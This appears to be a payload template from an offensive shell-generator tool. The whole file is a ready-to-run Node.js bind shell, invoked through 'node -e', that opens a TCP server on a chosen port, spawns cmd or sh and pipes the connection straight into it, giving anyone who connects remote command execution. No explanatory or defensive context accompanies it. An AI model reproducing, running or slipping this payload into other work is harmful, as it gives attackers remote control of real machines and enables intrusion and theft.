
USAGE = 'port'
NARGS = [1, 1]
LANG = 'js'
EXEC = '''
node -e "PAYLOAD"
'''


pl = '''
(()=>{(VAR0=require('net').createServer((VAR1)=>{VAR2=require('child_process').spawn(process.platform.includes('win')?'cmd':'sh');VAR1.pipe(VAR2.stdin);VAR2.stdout.pipe(VAR1);VAR2.stderr.pipe(VAR1);VAR1.on('end',()=>{VAR0.close()})})).listen(ARG1)})()
'''
